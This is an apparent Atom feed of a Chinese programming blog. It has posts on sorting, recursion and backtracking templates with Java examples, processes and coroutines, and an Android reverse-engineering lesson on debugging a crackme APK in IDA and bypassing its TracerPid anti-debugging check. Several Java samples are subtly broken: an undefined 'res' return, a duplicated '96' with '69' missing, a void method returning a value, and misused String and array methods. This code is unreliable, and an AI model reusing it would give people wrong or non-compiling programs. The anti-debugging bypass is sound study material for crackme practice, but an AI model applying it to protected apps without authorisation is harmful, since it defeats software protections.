sort）</h3><p>堆排序（Heapsort）是指利用堆这种数据结构所设计的一种排序算法。堆积是一个近似完全二叉树的结构，并同时满足堆积的性质：即子结点的键值或索引总是小于（或者大于）它的父节点。</p><p>参考资料：</p><blockquote><p><a href="https://www.cnblogs.com/onepixel/p/7674659.html">https://www.cnblogs.com/onepixel/p/7674659.html</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;排序算法比较&quot;&gt;&lt;a href=&quot;#排序算法比较&quot; class=&quot;headerlink&quot; title=&quot;排序算法比较&quot;&gt;&lt;/a&gt;排序算法比较&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;排序方法&lt;/th&gt;
&lt;th ali</summary>
      
    
    
    
    
    <category term="算法" scheme="http://yejuns.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>常用算法-递归</title>
    <link href="http://yejuns.github.io/2021/03/31/%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95-%E9%80%92%E5%BD%92/"/>
    <id>http://yejuns.github.io/2021/03/31/%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95-%E9%80%92%E5%BD%92/</id>
    <published>2021-03-31T08:01:51.000Z</published>
    <updated>2021-07-08T01:50:59.690Z</updated>
    
    <content type="html"><![CDATA[<p>递归算法是一种调⽤⾃自身函数的算法</p><h3 id="算法模板"><a href="#算法模板" class="headerlink" title="算法模板"></a>算法模板</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">fn</span><span class="params">(n)</span></span>&#123;</span><br><span class="line">    <span class="comment">//第一步：判断状态和条件是否合法</span></span><br><span class="line">    <span class="keyword">if</span>(n is invalid)&#123;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//第二步：判断递归是否应该结束</span></span><br><span class="line">    <span class="keyword">if</span>(match condition)&#123;</span><br><span class="line">        <span class="keyword">return</span> some operation;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//第三步：缩小问题规模</span></span><br><span class="line">    result1 = fn(n1);</span><br><span class="line">    result2 = fn(n2);</span><br><span class="line">    <span class="comment">//第四步：整合结果</span></span><br><span class="line">    <span class="keyword">return</span> combine(result1+result2); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="实例一"><a href="#实例一" class="headerlink" title="实例一"></a>实例一</h3><p>一条包含字母 A-Z 的消息通过以下方式进行编码</p><blockquote><p>‘A’ -&gt; 1</p><p>‘B’ -&gt; 2</p><p>….</p><p>‘Z’ -&gt; 26</p></blockquote><p>给定一个只包含数字的非空字符串，计算解码方式的总数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">numDecode</span><span class="params">(String s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>[] chars = s.toCharArray(s);</span><br><span class="line">    <span class="keyword">return</span> decode(chars,chars.length()-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">decode</span><span class="params">(<span class="keyword">char</span>[] chars,<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(index &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> cur = chars[index];</span><br><span class="line">    <span class="keyword">char</span> pre = chars[index-<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(cur &gt; <span class="string">&#x27;0&#x27;</span>)&#123;</span><br><span class="line">        count = decode(chars,index-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pre &lt; <span class="string">&#x27;2&#x27;</span> || (pre == <span class="string">&#x27;2&#x27;</span> &amp;&amp; cur &lt; <span class="string">&#x27;6&#x27;</span>))&#123;</span><br><span class="line">        count +=decode(chars,index-<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="实例二"><a href="#实例二" class="headerlink" title="实例二"></a>实例二</h3><p>中心对称数是指一个数字经过180度旋转后看起来仍然相同的数字，比如“8，11，69”。</p><p>找出所有长度为n的中心对称数</p><p>比如：输入 2 ；输出 11，69，88，96</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 输入的n，m相同</span></span><br><span class="line"><span class="function">List&lt;String&gt; <span class="title">cal</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> m)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;<span class="number">0</span>||m&lt;<span class="number">0</span>||n&gt;m)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;invalid input&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">new</span> ArrayList&lt;String&gt;(Arrays.asList(<span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>) <span class="keyword">return</span> <span class="keyword">new</span> ArrayList&lt;String&gt;(Arrays.aslist(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;8&quot;</span>));</span><br><span class="line"></span><br><span class="line">    List&lt;String&gt; list = cal(n-<span class="number">2</span>,m);</span><br><span class="line"></span><br><span class="line">    list&lt;String&gt; result = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;list.size();i++)&#123;</span><br><span class="line">        String s = list.get(i);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(n!=m) result.add(<span class="string">&quot;0&quot;</span>+s+<span class="string">&quot;0&quot;</span>);</span><br><span class="line"></span><br><span class="line">        result.add(<span class="string">&quot;1&quot;</span>+s+<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        result.add(<span class="string">&quot;9&quot;</span>+s+<span class="string">&quot;6&quot;</span>);</span><br><span class="line">        result.add(<span class="string">&quot;9&quot;</span>+s+<span class="string">&quot;6&quot;</span>);</span><br><span class="line">        result.add(<span class="string">&quot;8&quot;</span>+s+<span class="string">&quot;8&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="递归的优缺点"><a href="#递归的优缺点" class="headerlink" title="递归的优缺点"></a>递归的优缺点</h3><p>缺点：需要较多次数的函数调用，如果调用层数比较深，需要增加额外的堆栈处理(还有可能出现堆栈溢出的情况)，比如参数传递需要压栈等操作，会对执行效率有一定影响</p><p>优点：代码简洁、清晰</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;递归算法是一种调⽤⾃自身函数的算法&lt;/p&gt;
&lt;h3 id=&quot;算法模板&quot;&gt;&lt;a href=&quot;#算法模板&quot; class=&quot;headerlink&quot; title=&quot;算法模板&quot;&gt;&lt;/a&gt;算法模板&lt;/h3&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;t</summary>
      
    
    
    
    
    <category term="算法" scheme="http://yejuns.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>常用算法-回朔</title>
    <link href="http://yejuns.github.io/2021/03/30/%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95-%E5%9B%9E%E6%9C%94/"/>
    <id>http://yejuns.github.io/2021/03/30/%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95-%E5%9B%9E%E6%9C%94/</id>
    <published>2021-03-30T08:01:51.000Z</published>
    <updated>2021-07-09T12:10:06.310Z</updated>
    
    <content type="html"><![CDATA[<p>回朔算法是一种试探算法，在回朔算法中，是一步一步向前试探，会对没每一步的结果进行预估，可防止走弯路。</p><h3 id="算法模板"><a href="#算法模板" class="headerlink" title="算法模板"></a>算法模板</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">fn</span><span class="params">(n)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 判断状态是否合法</span></span><br><span class="line">   <span class="keyword">if</span>(input is invalid)&#123;</span><br><span class="line">       <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">//    判断递归是否应该结束</span></span><br><span class="line">   <span class="keyword">if</span>(match condition)&#123;</span><br><span class="line">       <span class="keyword">return</span> some value;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">// 遍历所有可能出现的情况</span></span><br><span class="line">   <span class="keyword">for</span>(all possible <span class="keyword">case</span>)&#123;</span><br><span class="line">    <span class="comment">//    尝试下一步的可能性</span></span><br><span class="line">       solution.push(m);</span><br><span class="line">    <span class="comment">//    递归</span></span><br><span class="line">       result = fn(m);</span><br><span class="line">    <span class="comment">//    回朔到上一步</span></span><br><span class="line">       solution.pop(m);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="实例一"><a href="#实例一" class="headerlink" title="实例一"></a>实例一</h3><p>给定一个⽆重复元素的数组 candidates 和一个目标数 target ，找<br>出 candidates 中所有可以使数字和为 target 的组合</p><p>candidates 中的数字可以无限制重复被选取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; combinationSum(<span class="keyword">int</span>[] candidates, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        Arrays.sort(candidates);</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();<span class="comment">//新建堆栈用来判断</span></span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();<span class="comment">//结果集</span></span><br><span class="line">        <span class="keyword">if</span> (candidates == <span class="keyword">null</span> || candidates.length == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        combin(candidates, <span class="number">0</span>, target, list, res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//对数组元素（已排序）进行逐个判断以及加入结果集</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">combin</span><span class="params">(<span class="keyword">int</span>[] candidates, <span class="keyword">int</span> start, <span class="keyword">int</span> target,List&lt;Integer&gt; list, List&lt;List&lt;Integer&gt;&gt; res)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//刚好满足则将结果存入结果集</span></span><br><span class="line">        <span class="keyword">if</span> (target == <span class="number">0</span>) &#123;</span><br><span class="line">            res.add(<span class="keyword">new</span> ArrayList&lt;&gt;(list));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = start; i &lt; candidates.length; i ++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (candidates[i] &lt;= target) &#123; <span class="comment">//判断是否已经大于target</span></span><br><span class="line">                list.add(candidates[i]);<span class="comment">//将第一个元素存入         </span></span><br><span class="line">                combin(candidates, i, target -candidates[i] , list, res);<span class="comment">//继续判断进栈元素</span></span><br><span class="line">                list.remove(list.size() - <span class="number">1</span>);<span class="comment">//不满足则将最后一个元素移除，进栈新元素判断</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="实例二"><a href="#实例二" class="headerlink" title="实例二"></a>实例二</h3><p>如何将 n 个皇后放置在 n×n 的棋盘上，并且使皇后彼此之间不能相互攻击。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 处在对角线上也可以进行攻击</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> row,<span class="keyword">int</span> col,<span class="keyword">int</span>[] columns)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> r=<span class="number">0</span>;r&lt;row;r++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(columns[r]==col || row-r == Math.abs(columns[r]-col))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> count;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">totalNQueens</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    count = <span class="number">0</span>;</span><br><span class="line">    backtracking(n,<span class="number">0</span>,<span class="keyword">new</span> <span class="keyword">int</span>[n]);</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backtracking</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> row,<span class="keyword">int</span>[] columns)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(row == n)&#123;</span><br><span class="line">        count++;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> col=<span class="number">0</span>;col&lt;n;col++)&#123;</span><br><span class="line">        columns[row] = col;</span><br><span class="line">        <span class="keyword">if</span>(check(row,col,columns))&#123;</span><br><span class="line">            backtracking(n,row+<span class="number">1</span>,columns);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        columns[row]=-<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;回朔算法是一种试探算法，在回朔算法中，是一步一步向前试探，会对没每一步的结果进行预估，可防止走弯路。&lt;/p&gt;
&lt;h3 id=&quot;算法模板&quot;&gt;&lt;a href=&quot;#算法模板&quot; class=&quot;headerlink&quot; title=&quot;算法模板&quot;&gt;&lt;/a&gt;算法模板&lt;/h3&gt;&lt;figure</summary>
      
    
    
    
    
    <category term="算法" scheme="http://yejuns.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>进程、线程和协程.md</title>
    <link href="http://yejuns.github.io/2021/03/23/%E8%BF%9B%E7%A8%8B%E3%80%81%E7%BA%BF%E7%A8%8B%E5%92%8C%E5%8D%8F%E7%A8%8Bmd/"/>
    <id>http://yejuns.github.io/2021/03/23/%E8%BF%9B%E7%A8%8B%E3%80%81%E7%BA%BF%E7%A8%8B%E5%92%8C%E5%8D%8F%E7%A8%8Bmd/</id>
    <published>2021-03-23T07:56:49.000Z</published>
    <updated>2021-08-02T15:11:47.543Z</updated>
    
    <content type="html"><![CDATA[<p>计算机里有两类大的资源：CPU 资源和 IO 资源。</p><ul><li>计算型的任务 主要消耗CPU 资源，比如对字符串进行 base64 编码；</li><li>输入输出类的系统调用 主要消耗 IO 资源，部分 IO 和硬件中断相关。CPU 芯片引脚上接入了很多控制芯片，比如中断控制器芯片 <code>8259A</code>。当键盘打字，中断芯片触发 CPU 上的硬件中断，CPU 被调度来处理键盘输入。</li></ul><h3 id="进程："><a href="#进程：" class="headerlink" title="进程："></a>进程：</h3><p>一个进程好比是一个程序，它是资源分配的最小单位 。同一时刻执行的进程数不会超过核心数。但是单核CPU也可以运行多进程，只不过不是同时，而是极快地在进程间来回切换实现的多进程。举个简单的例子，就算是十年前的单核CPU的电脑，也可以聊QQ的同时看视频。</p><p>电脑中有许多进程需要处于「同时」开启的状态，而利用CPU在进程间的快速切换，可以实现「同时」运行多个程序。而进程切换则意味着需要保留进程切换前的状态，以备切换回去的时候能够继续接着工作。所以进程拥有自己的地址空间，全局变量，文件描述符，各种硬件等等资源。操作系统通过调度CPU去执行进程的记录、回复、切换等等。</p><h3 id="线程："><a href="#线程：" class="headerlink" title="线程："></a>线程：</h3><p>线程是依赖于进程的，也称为 「微进程」。它是程序执行过程中的最小单元 。假设现在 8 核 CPU 上有 4 个进程，每个进程开 10 个线程，理论上也只能同步并行跑 8 个线程，其他线程都是假性的并行运行。</p><h2 id="进程与线程的区别"><a href="#进程与线程的区别" class="headerlink" title="进程与线程的区别"></a>进程与线程的区别</h2><ol><li>进程是CPU资源分配的基本单位，线程是独立运行和独立调度的基本单位（CPU上真正运行的是线程）</li><li>进程拥有自己的资源空间，一个进程包含若干个线程，线程与CPU资源分配无关，多个线程共享同一进程内的资源。</li><li>线程的调度与切换比进程快很多</li></ol><p>举个例子：<br>电脑上跑着chrome和QQ，着就是2个不同的进程。<br>Chrome进程里有多个线程进行，比如下载文件、视频播放。每个线程占据一个核心（8核CUP中的一个）。<br>从chrome切换到QQ，意味着进程进程了切换。</p><p><code>ps -T -p &lt;pid&gt;  查看该进程下的所有线程</code></p><h3 id="协程："><a href="#协程：" class="headerlink" title="协程："></a>协程：</h3><ul><li>协程是一种用户态的轻量级线程，拥有自己的寄存器上下文和栈，协程调度切换时，将寄存器上下文和栈保存在其他地方，再切回来的时候，恢复先前的寄存器上下文和栈</li><li>协程表示一个执行单元，有自己的本地数据，与其他协程共享全局数据和其他资源</li><li>我们的代码跑在线程中的，而线程是跑在进程中的。协程没有直接和操作系统关联，但他是跑在线程中的，可以是单线程，也可以是多线程</li><li>线程进程都是同步机制，而协程则是异步（一个线程内的多个协程的运行是串行的）</li></ul><p>协程优点</p><ol><li>无需线程上下文切换的开销</li><li>无需原子操作锁定及同步的开销</li><li>方便切换控制流</li><li>高并发低成本</li></ol><p>使用协程一般是解决   I/O阻塞   </p><p>（为什么线程不能解决：   因为一个IO操作就阻塞了当前线程，导致其他代码无法执行，所以我们必须使用多线程或者多进程来并发执行代码，为多个用户服务。每个用户都会分配一个线程，如果遇到IO导致线程被挂起，其他用户的线程不受影响。多线程和多进程的模型虽然解决了并发问题，但是系统不能无上限地增加线程。由于系统切换线程的开销也很大，所以，一旦线程数量过多，CPU的时间就花在线程切换上了，真正运行代码的时间就少了，结果导致性能严重下降。）</p><p>因为当一个I/O阻塞时，它可以切换到其他没有阻塞的协程上去继续执行，这样就有了比较高的效率</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><p><a href="http://fuzhii.com/2021/04/02/coroutine-switch/?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io">http://fuzhii.com/2021/04/02/coroutine-switch/?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io</a><br><a href="https://mp.weixin.qq.com/s/Tp680dfOB7Zb6xlXSay7XA">https://mp.weixin.qq.com/s/Tp680dfOB7Zb6xlXSay7XA</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;计算机里有两类大的资源：CPU 资源和 IO 资源。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;计算型的任务 主要消耗CPU 资源，比如对字符串进行 base64 编码；&lt;/li&gt;
&lt;li&gt;输入输出类的系统调用 主要消耗 IO 资源，部分 IO 和硬件中断相关。CPU 芯片引脚上接入了很多</summary>
      
    
    
    
    
    <category term="计算机基础" scheme="http://yejuns.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向第八课 - IDA动态调试</title>
    <link href="http://yejuns.github.io/2021/03/18/Android%E9%80%86%E5%90%91%E7%AC%AC%E5%85%AB%E8%AF%BE/"/>
    <id>http://yejuns.github.io/2021/03/18/Android%E9%80%86%E5%90%91%E7%AC%AC%E5%85%AB%E8%AF%BE/</id>
    <published>2021-03-18T11:01:51.000Z</published>
    <updated>2021-08-11T01:50:05.917Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ida动态调试"><a href="#ida动态调试" class="headerlink" title="ida动态调试"></a>ida动态调试</h2><p>如果要进行动态调试，首先需要搭建相关环境，我使用的还是阿里的 <code>crackMe.apk</code> 进行测试。</p><p>1、将 IDAPro\dbgsrv 目录下的<code>android_server</code> push 到手机/data/local/tmp/目录下 给777权限 并./运行,  <code>adb push android_x86_server(cpu型号要对应 模拟器是x86) /data/local/tmp/</code></p><p>2、端口转发,命令 <code>adb forward tcp:23946 tcp:23946</code></p><p>3、本地打开IDA，选中 <code>Go</code>按钮，然后入下图操作，就可以进行动态分析<br><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-6.png"></p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-7.png"></p><p>4、 获取进程信息成功后，在主页面通过<code>ctrl + s</code> 找到要调试的so文件 选择有 X 的（可执行的），这里我们也可以使用 ctrl+F 找出目标so文件</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-8.png"></p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-9.png"></p><p>5、 在对 <code>so</code>文件进行静态分析的时候，我们可以获取到每个函数的偏移，而在进行动态调试的时候，由于 <code>so</code>文件被加载到内存，每个函数都存在真实的地址，我们需要算出目标函数的真实地址。比如：<code>check()</code> 函数的偏移量是 <code>0x65403</code>，(可以理解为相对于so文件头的距离),我们动态打开ida，选中 so 文件的时候，会显示这个 so 文件头的绝对地址 <code>F4012C6</code>，F4012C6 + 0x65403 就是 check 函数的绝对地址。</p><p>按G键， 输入绝对地址，跳转到要调试的函数处</p><p>如何计算要调试函数的绝对地址？</p><ul><li>绝对地址 = so文件的基地址 + 该函数的偏移量</li></ul><p>so文件的基地址在哪儿找？</p><ul><li>快捷键 ctrl + s 找到目标so文件 Start 那一项就是 基地址</li></ul><p>函数的偏移量在哪儿找？</p><ul><li>以静态方式打开so文件，函数列表里</li></ul><h3 id="1-调试原理"><a href="#1-调试原理" class="headerlink" title="1. 调试原理"></a>1. 调试原理</h3><p>利用Linux系统 <code>ptrace</code> 来实现，<code>ptrace 系统调用</code>可以允许一个进程控制另外一个进程并从内部替换 Peek and poke 被控制进程的内核镜像的值（Peek and poke 指的是直接读写内存内容）</p><p>当我们使用Ptrace方式跟踪一个进程时，目标进程会记录自己被谁跟踪，可以查看/proc/pid/status看到这个信息, 当应用被调试时，<code>TracerPid</code> 字段就不为 0。</p><p><strong>反调试</strong>，既检测 <code>TracerPid</code> 是否被占用。新建一个线程不停的检测TracerPid这个字段是否不为0，不为0，就立即退出程序。</p><p><strong>反反调试</strong>，动态调试，找到检测 TracerPid 的代码，不执行此代码，</p><p>此检查代码一般在<code>.init_arra</code> 和 <code>JNI_OnLoad</code> 两处, 在 JNI_OnLoad 函数出打断点调试，找到检测 TracerPid 的代码，不执行此代码</p><h3 id="2-实例"><a href="#2-实例" class="headerlink" title="2. 实例"></a>2. 实例</h3><p>我们上次通过静态分析找出了 <code>crackMe.apk</code> 中密码所在的关键位置<code>off_628C</code>，现在我们需要通过动态调试进行确认内容。</p><p>首先，使用ida静态确定 <code>Java_com_yaotong_crackme_MainActivity_securityCheck()</code> 这个方法的偏移量，<code>000011A8</code></p><p>然后，用ida动态加载app，找出crakeMe.so 文件的启始位置是 <code>F40B8000</code>，使用计算机器，可以算出 <code>securityCheck()</code> 的绝对地址是 <code>F40B91A8</code>。在ida的动态调试界面，使用快捷键 <code>G</code>,进行地址跳转，跳转后的结果也证明我们的目标没有错</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-10.png"></p><p>右击方法名添加断点，断点设置好后，点击左上角三角形运行，等待APP运行到此断点处，就会停止，此时即可调试（有时候会不能成功运行，那就需要重新加载该 so 文件)。我们这里会直接退出，主页面上显示 <code>ffffffff</code>, 这说明该 so 文件加了反调试。</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-11.png"></p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-12.png"></p><p>接下来的任务就是如何去绕过程序的反调试机制 ?</p><p><strong>如何找到反调试代码</strong></p><p>指令一般会整过执行完，直到函数末尾。多次IDA中，如果指令在中途某个地方退出了，说明该处就是反调试指令</p><p><strong>如何在JNI_OnLoad函数打断点</strong></p><p>so文件在加载阶段会执行JNI_ONLoad，此后不再执行，要在so文件加载阶段才给JNI_OnLoad 打断点</p><ol><li><p>修改APP AndroidMenifest.xml文件， 给APP加上可调试权限，android:debuggable=”true”，然后重新打包APP，签名，安装;<br><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-14.png"></p></li><li><p>检查flags中是否允许debug项：</p><p>adb shell dumpsys package com.yaotong.crackme<br>（会显示相关进行的信息，是否允许debug等）</p></li><li><p>以调试模式启动APP，APP此时会挂住</p><p>adb shell am start -D -n 包名/.类名</p><p>adb shell am start -D -n com.yaotong.crackme/.MainActivity</p></li><li><p>在ida的 DebuggerOptions 里勾选 <code>Suspend on thread start/exit</code> 和<code>Suspend on library load/unload</code>。 JNI_OnLoad 函数是 lib 刚加载时就会执行，必须要在lib载入时就让程序停下来，才能调试JNI_OnLoad；</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-13.png"></p></li><li><p>在ida里点击运行按钮，然在设备里查看APP的进程ID，<code>ps | grep 应用包名</code>;</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-15.png"></p></li><li><p>使用JDB命令让 APP 恢复运行</p><p>adb forward tcp:8700 jdwp:873（APP的PID）</p><p>jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-16.png"></p></li><li><p>在so文件被加载时，IDA会停止住，使用ctrl+s 查看目标so文件是否加载. 若加载了目标so文件，计算JNI_OnLoad的绝对地址，按G键跳转到JNI_OnLoad出设置断点，恢复APP执行。<br><img 